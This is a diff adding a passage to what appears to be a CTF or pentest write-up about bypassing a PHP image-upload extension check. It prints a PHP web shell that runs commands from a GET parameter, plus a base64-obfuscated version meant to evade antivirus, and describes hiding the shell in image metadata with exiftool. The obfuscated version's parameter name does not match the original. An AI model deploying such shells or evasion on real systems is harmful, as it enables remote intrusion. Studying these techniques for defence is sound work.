@@ -222,4 +222,25 @@ if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
     die();
 
 ```
+`[1]` retrieves the second element from the array, which represents the file extension.
+`in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)` checks if the file extension exists in the `$goodExts` array and if the extension is not found in the array the file is not uploaded.
+
+Indeed, a legitmate image had to be uploaded so I used exiftool to allow me to place php shell code into the image metadata.
+Knowing that anti-virus is present on the machine, it would be pretty foolish to upload a file containing an obvious shell but PHP Obfuscator (https://www.gaijin.at/en/tools/php-obfuscator) provides a means of obscuring the code, increasing the liklihood that it remains undetected by anti-virus.
+
+Eg :
+
+```
+<?php
+    $cmd = $_GET["mrjokar"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+```
+
+Becomes:
+
+``` <?php \$u0=\$_GET[base64_decode('ZnJvc3Q=')];if(isset(\$u0)){echo base64_decode('PHByZT4=').shell_exec(\$u0).base64_decode('PC9wcmU+');}die();?> ```
 
